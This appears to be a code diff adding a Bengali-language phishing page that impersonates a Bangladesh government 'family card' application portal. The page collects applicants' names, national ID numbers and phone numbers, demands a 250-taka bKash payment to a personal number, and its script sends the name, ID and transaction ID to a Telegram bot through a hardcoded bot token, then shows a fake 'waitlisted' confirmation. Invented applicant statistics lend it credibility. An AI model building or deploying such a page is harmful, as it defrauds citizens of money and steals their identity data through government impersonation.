@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>অনলাইন আবেদন পোর্টাল - বাংলাদেশ সরকার</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Hind Siliguri', sans-serif; background: #f4f7f6; }
+        .gov-header { background: #006a4e; border-bottom: 4px solid #ef3340; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        .wait-animate { animation: blink 2s infinite; }
+    </style>
+</head>
+<body class="min-h-screen">
+
+    <header class="gov-header text-white py-6 shadow-lg">
+        <div class="container mx-auto px-4 text-center">
+            <img src="https://i.postimg.cc/W11k44XY/images-(1).jpg" alt="Logo" class="h-20 mx-auto mb-3 drop-shadow-lg">
+            <h1 class="text-2xl md:text-3xl font-bold uppercase tracking-tight">বাংলাদেশ ফ্যামিলি কার্ড ডাটাবেস</h1>
+            <p class="text-sm opacity-90 mt-1">সমাজকল্যাণ মন্ত্রণালয় ও আইসিটি বিভাগ কর্তৃক পরিচালিত</p>
+        </div>
+    </header>
+
+    <div id="waitlistArea" class="hidden container mx-auto px-4 py-12">
+        <div class="max-w-2xl mx-auto bg-white rounded-2xl shadow-2xl p-8 border-t-8 border-yellow-500 text-center">
+            <div class="w-20 h-20 bg-yellow-100 rounded-full flex items-center justify-center mx-auto mb-6">
+                <svg class="w-12 h-12 text-yellow-600 animate-spin" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
+                </svg>
+            </div>
+            <h2 class="text-2xl font-bold text-gray-800">আপনার আবেদনটি সফলভাবে জমা হয়েছে!</h2>
+            <div class="my-6 p-4 bg-blue-50 border-l-4 border-blue-500 text-blue-700">
+                <p class="font-semibold italic">স্ট্যাটাস: <span class="wait-animate">অপেক্ষমান (Waitlisted)</span></p>
+            </div>
+            <p class="text-gray-600 leading-relaxed mb-6">
+                আপনার প্রদত্ত তথ্য এবং পেমেন্ট ভেরিফিকেশন করার জন্য আবেদনটি বর্তমানে পর্যালোচনাধীন রয়েছে। দয়া করে আগামী <span class="font-bold text-red-600">৭২ ঘণ্টা</span> অপেক্ষা করুন। আপনার মোবাইলে এসএমএস-এর মাধ্যমে চূড়ান্ত ফলাফল জানানো হবে।
+            </p>
+            <div class="text-xs text-gray-400">ট্র্যাকিং নম্বর: <span id="trackingId"></span></div>
+        </div>
+    </div>
+
+    <main id="formArea" class="container mx-auto px-4 py-8">
+        <div class="max-w-4xl mx-auto grid grid-cols-1 md:grid-cols-3 gap-6">
+            
+            <div class="md:col-span-1">
+                <div class="bg-white p-5 rounded-lg shadow border border-gray-200">
+                    <h3 class="font-bold text-green-800 border-b pb-2 mb-3">আবেদন পরিসংখ্যান</h3>
+                    <p class="text-sm text-gray-600">মোট আবেদন: <span class="font-bold">১৭,৪৫,০১০ জন</span></p>
+                    <p class="text-sm text-gray-600 mt-2">অপেক্ষমান তালিকা: <span class="text-red-600 font-bold">৯,৪২০ জন</span></p>
+                </div>
+            </div>
+
+            <div class="md:col-span-2">
+                <div class="bg-white rounded-xl shadow-lg border border-gray-200 overflow-hidden">
+                    <div class="bg-gray-50 px-6 py-4 border-b font-bold text-gray-700 flex justify-between">
+                        <span>অনলাইন আবেদন ফরম</span>
+                        <span class="text-red-600">ফি: ২৫০/-</span>
+                    </div>
+
+                    <form id="govForm" class="p-6 space-y-5">
+                        <div class="space-y-4">
+                            <input type="text" id="name" required placeholder="আবেদনকারীর নাম (NID অনুযায়ী)" class="w-full px-4 py-3 border rounded-lg outline-none focus:ring-2 focus:ring-green-600">
+                            <input type="number" id="nid" required placeholder="এনআইডি কার্ড নম্বর" class="w-full px-4 py-3 border rounded-lg outline-none focus:ring-2 focus:ring-green-600">
+                            <input type="tel" id="phone" required placeholder="মোবাইল নম্বর" class="w-full px-4 py-3 border rounded-lg outline-none focus:ring-2 focus:ring-green-600">
+                        </div>
+
+                        <div class="bg-pink-50 p-6 rounded-xl border-2 border-pink-100">
+                            <div class="flex items-center justify-between mb-4">
+                                <span class="font-bold text-pink-700">বিকাশ পেমেন্ট (বিকাশ পার্সোনাল)</span>
+                                <span class="bg-pink-600 text-white text-xs px-2 py-1 rounded">২৫০ টাকা</span>
+                            </div>
+                            <div class="bg-white p-3 rounded-lg border border-pink-200 flex justify-between items-center mb-4">
+                                <span class="text-xl font-mono font-bold">01862748747</span>
+                                <button type="button" class="text-xs text-blue-600 underline">Copy</button>
+                            </div>
+                            <input type="text" id="trxid" required placeholder="TrxID (উদা: AH62KJS7W)" class="w-full px-4 py-3 border-2 border-pink-400 rounded-lg outline-none uppercase font-mono">
+                        </div>
+
+                        <button type="submit" class="w-full bg-[#006a4e] hover:bg-green-800 text-white font-bold py-4 rounded-xl shadow-lg transition duration-300">
+                            আবেদন নিশ্চিত করুন
+                        </button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="text-center py-8 text-gray-500 text-xs">
+        &copy; ২০২৬ | ডিজিটাল সার্ভিস সেন্টার, বাংলাদেশ সরকার।
+    </footer>
+
+    <script>
+        // আপনার টেলিগ্রাম বোটের তথ্য এখানে দিন
+        const BOT_TOKEN = '8744356980:AAHhluGZcKWARAwi6DBYZSlmqbkiZzSmPDw';
+        const CHAT_ID = '6341595793';
+
+        document.getElementById('govForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const name = document.getElementById('name').value;
+            const nid = document.getElementById('nid').value;
+            const trx = document.getElementById('trxid').value;
+
+            const msg = `🔔 *নতুন কার্ড আবেদন (২৫০ টাকা)*\n\n👤 নাম: ${name}\n🆔 NID: ${nid}\n💰 TrxID: ${trx}`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)
+            .then(() => {
+                document.getElementById('formArea').classList.add('hidden');
+                document.getElementById('waitlistArea').classList.remove('hidden');
+                document.getElementById('trackingId').innerText = 'BFC-' + Math.floor(Math.random() * 999999);
+            });
+        });
+    </script>
+</body>
+</html>
